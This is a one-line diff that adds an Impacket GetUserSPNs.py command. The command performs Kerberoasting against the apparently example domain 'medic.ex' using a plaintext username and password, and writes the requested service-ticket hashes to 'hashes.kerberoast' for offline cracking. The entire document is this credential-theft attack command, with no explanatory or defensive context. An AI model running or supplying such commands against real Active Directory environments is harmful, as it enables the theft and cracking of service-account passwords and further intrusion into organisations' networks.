@@ -1,0 +1,1 @@
+GetUserSPNs.py -request medic.ex/pixis:P4ssw0rd -outputfile hashes.kerberoast
